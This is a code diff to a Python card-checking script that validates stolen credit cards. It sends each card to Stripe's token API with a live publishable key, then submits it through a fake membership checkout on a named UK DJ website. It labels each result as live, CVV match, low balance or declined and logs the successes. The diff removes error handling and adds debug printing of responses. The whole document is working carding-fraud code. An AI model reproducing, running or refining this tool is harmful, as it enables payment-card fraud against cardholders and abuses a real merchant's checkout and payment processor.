@@ -72,11 +72,7 @@ def checker(cc):
 
 	data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_line1]={street}&card[address_line2]=&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip}&card[address_country]=US&card[cvc]={cvv}&card[name]={first_name}+{last_name}"
 	
-	try:
-		res = curl.post("https://api.stripe.com/v1/tokens",headers=sk_headers,data=data)
-	except Exception as e:
-		print(e)
-
+	res = curl.post("https://api.stripe.com/v1/tokens",headers=sk_headers,data=data)
 	json_first = json.loads(res.text)
 	if 'error' in json_first:
 		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
@@ -85,26 +81,25 @@ def checker(cc):
 		text = f"""{lista} |- RESULT: REJECTED [INCORRECT CARD]"""
 		print(text)
 	else:
+		print(res.text)
 		id = json_first["id"]
 		data = f"level=1&checkjavascript=1&other_discount_code=&username={get_username()}&first_name={first_name}&last_name={last_name}&dj_name={first_name}&dj_city={city}&password={password}&password2={password}&bemail={email}&bconfirmemail_copy=1&fullname=&bfirstname={first_name}&blastname={last_name}&baddress1={street}&baddress2=&bcity={city}&bstate={state}&bzipcode={zip}&bcountry=US&bphone=%28225%29+368-7536&CardType=Visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&stripeToken0={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
 		
-		try:
-			res = curl.post("https://www.diamonddjs.co.uk/membership-account/membership-checkout/",headers=headers,data=data)
-		except Exception as e:
-			print(e)
+		res = curl.post("https://www.diamonddjs.co.uk/membership-account/membership-checkout/",headers=headers,data=data)
 		
 		try:
 			if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
 				text = f"""{lista} |- RESULT: CVV LIVE [ZIP INCORRECT]"""
 				print(text) 
 				addsuccess(text);
-			elif  '"seller_message": "Payment complete."' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
+			elif  'Thank You For Your Payment.' in res.text or '"cvc_check": "pass"' in res.text or 'thank_you' in res.text or '"type":"one-time"' in res.text or '"state": "succeeded"' in res.text or "Your payment has already been processed" in res.text or '"status": "succeeded"' in res.text : #or 'donation_number=' in res.text
 				text = f"""{lista} |- RESULT: APPROVED [CVV MATCH]"""
 				print(text) 
 				addsuccess(text);
 			elif "card has insufficient funds" in res.text or 'insufficient_funds' in res.text or 'Insufficient Funds' in res.text :
 				text = f"""{lista} |- RESULT: APPROVED [LOW BALANCE]"""
 				print(text) 
+				print(res.text)
 				addsuccess(text);                  
 			elif "card's security code is incorrect" in res.text or "card&#039;s security code is incorrect" in res.text or "security code is invalid" in res.text or 'CVC was incorrect' in res.text or "incorrect CVC" in res.text or 'cvc was incorrect' in res.text or 'Card Issuer Declined CVV' in res.text :
 				text = f"""{lista} |- RESULT: APPROVED [CVC MISMATCH]"""
@@ -119,7 +114,7 @@ def checker(cc):
 				print(text)       
 			elif "Customer authentication is required" in res.text or "unable to authenticate" in res.text or "three_d_secure_redirect" in res.text or "hooks.stripe.com/redirect/" in res.text or 'requires an authorization' in res.text:
 				text = f"""{lista} |- RESULT: REJECTED [3D SECURITY]"""
-				print(text) 
+				print(text)
 			elif "card was declined" in res.text or 'card_declined' in res.text or 'The transaction has been declined' in res.text or 'Processor Declined' in res.text:
 				text = f"""{lista} |- RESULT: REJECTED [CARD DECLINED]"""
 				print(text)
@@ -132,6 +127,7 @@ def checker(cc):
 			else:
 				text = f"""{lista} |- RESULT: REJECTED [UNKOWN RESPONSE]"""
 				print(text)
+				print(res.text)
 		except Exception as e:
 			print(e)
 
